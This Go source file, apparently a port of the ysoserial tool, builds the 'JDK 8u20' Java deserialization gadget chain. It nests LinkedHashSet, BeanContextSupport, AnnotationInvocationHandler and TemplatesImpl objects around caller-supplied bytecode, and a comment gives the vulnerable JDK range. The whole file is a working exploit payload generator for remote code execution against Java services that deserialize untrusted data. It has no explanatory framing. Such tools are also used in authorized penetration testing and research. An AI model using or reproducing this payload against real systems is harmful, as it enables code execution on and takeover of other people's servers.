package ysoserial

// 7u25-b03(2013-06-18) <= Jdk version < 8u72-b12(2015-12-08)
func Jdk8u20(bytecodes []byte) []byte {
	return ClassObject{
		name:             "java.util.LinkedHashSet",
		serialVersionUID: -2851667679971038690,
		classDescFlags:   SC_SERIALIZABLE,
		fields:           []Field{},
		classAnnotations: interfaces(),
		super: &ClassObject{
			name:             "java.util.HashSet",
			serialVersionUID: -5024744406713321676,
			classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
			fields:           []Field{},
			classAnnotations: interfaces(
				ClassObject{
					name:             "java.beans.beancontext.BeanContextSupport",
					serialVersionUID: -4879613978649577204,
					classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
					fields: []Field{
						{Integer, "serializable", 1},
					},
					classAnnotations: interfaces(),
					super: &ClassObject{
						name:             "java.beans.beancontext.BeanContextChildSupport",
						serialVersionUID: 6328947014421475877,
						classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
						fields: []Field{
							{"Ljava/beans/beancontext/BeanContextChild;", "beanContextChildPeer", reference(-1)},
						},
						classAnnotations:  interfaces(),
						super:             nil,
						objectAnnotations: interfaces(),
					},
					objectAnnotations: interfaces(
						ClassObject{
							name:             "sun.reflect.annotation.AnnotationInvocationHandler",
							serialVersionUID: 6182022883658399397,
							classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
							fields: []Field{
								{"Ljava/util/Map;", "memberValues", ClassObject{
									name:             "java.util.HashMap",
									serialVersionUID: 362498820763181265,
									classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
									fields: []Field{
										{Float, "loadFactor", 0.75},
										{Integer, "threshold", 12},
									},
									classAnnotations: interfaces(),
									super:            nil,
									objectAnnotations: interfaces(
										blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01},
										"f5a5a608",
										ClassObject{
											name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
											serialVersionUID: 673094361519270707,
											classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
											fields: []Field{
												{Integer, "_indentNumber", 1},
												{Integer, "_transletIndex", -1},
												{Boolean, "_useServicesMechanism", true},
												{"[[B", "_bytecodes", ArrayObject{
													name:             "[[B",
													serialVersionUID: 5475560301672258359,
													classDescFlags:   SC_SERIALIZABLE,
													values: interfaces(
														ArrayObject{
															name:             "[B",
															serialVersionUID: -5984413125824719648,
															classDescFlags:   SC_SERIALIZABLE,
															values:           bytesToInterfaces(bytecodes),
															annotations:      interfaces(),
														},
													),
													annotations: interfaces(),
												},
												},
												{"Ljava/lang/String;", "_name", "abc"},
											},
											classAnnotations: interfaces(),
											super:            nil,
											objectAnnotations: interfaces(
												blockData{0x00},
											),
										},
									),
								},
								},
								{"Ljava/lang/Class;", "type", ClassDesc{
									name:             "javax.xml.transform.Templates",
									serialVersionUID: 0,
									classDescFlags:   0x00,
								},
								},
							},
							classAnnotations:  interfaces(),
							super:             nil,
							objectAnnotations: interfaces(NO_TC_ENDBLOCKDATA),
						},
						blockData{0x00, 0x00, 0x00, 0x00},
					),
				},
			),
			super: nil,
			objectAnnotations: interfaces(
				blockData{0x00, 0x00, 0x00, 0x10, 0x3f, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02},
				ClassObject{
					name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
					serialVersionUID: 673094361519270707,
					classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
					fields: []Field{
						{Integer, "_indentNumber", 1},
						{Integer, "_transletIndex", -1},
						{Boolean, "_useServicesMechanism", true},
						{"[[B", "_bytecodes", ArrayObject{
							name:             "[[B",
							serialVersionUID: 5475560301672258359,
							classDescFlags:   SC_SERIALIZABLE,
							values: interfaces(
								ArrayObject{
									name:             "[B",
									serialVersionUID: -5984413125824719648,
									classDescFlags:   SC_SERIALIZABLE,
									values:           bytesToInterfaces(bytecodes),
									annotations:      interfaces(),
								},
							),
							annotations: interfaces(),
						},
						},
						{"Ljava/lang/String;", "_name", "abc"},
					},
					classAnnotations: interfaces(),
					super:            nil,
					objectAnnotations: interfaces(
						blockData{0x00},
					),
				},
				ProxyClassObject{
					name: "java.lang.reflect.Proxy",
					interfaces: []string{
						"javax.xml.transform.Templates",
					},
					serialVersionUID: -2222568056686623797,
					classDescFlags:   SC_SERIALIZABLE,
					fields: []Field{
						{"Ljava/lang/reflect/InvocationHandler;", "h", ClassObject{
							name:             "sun.reflect.annotation.AnnotationInvocationHandler",
							serialVersionUID: 6182022883658399397,
							classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
							fields: []Field{
								{"Ljava/util/Map;", "memberValues", ClassObject{
									name:             "java.util.HashMap",
									serialVersionUID: 362498820763181265,
									classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
									fields: []Field{
										{Float, "loadFactor", 0.75},
										{Integer, "threshold", 12},
									},
									classAnnotations: interfaces(),
									super:            nil,
									objectAnnotations: interfaces(
										blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01},
										"f5a5a608",
										ClassObject{
											name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
											serialVersionUID: 673094361519270707,
											classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
											fields: []Field{
												{Integer, "_indentNumber", 1},
												{Integer, "_transletIndex", -1},
												{Boolean, "_useServicesMechanism", true},
												{"[[B", "_bytecodes", ArrayObject{
													name:             "[[B",
													serialVersionUID: 5475560301672258359,
													classDescFlags:   SC_SERIALIZABLE,
													values: interfaces(
														ArrayObject{
															name:             "[B",
															serialVersionUID: -5984413125824719648,
															classDescFlags:   SC_SERIALIZABLE,
															values:           bytesToInterfaces(bytecodes),
															annotations:      interfaces(),
														},
													),
													annotations: interfaces(),
												},
												},
												{"Ljava/lang/String;", "_name", "abc"},
											},
											classAnnotations: interfaces(),
											super:            nil,
											objectAnnotations: interfaces(
												blockData{0x00},
											),
										},
									),
								},
								},
								{"Ljava/lang/Class;", "type", ClassDesc{
									name:             "javax.xml.transform.Templates",
									serialVersionUID: 0,
									classDescFlags:   0x00,
								},
								},
							},
							classAnnotations:  interfaces(),
							super:             nil,
							objectAnnotations: interfaces(NO_TC_ENDBLOCKDATA),
						},
						},
					},
				},
			),
		},
		objectAnnotations: interfaces(),
	}.SerializeWithMagicHeader()
}
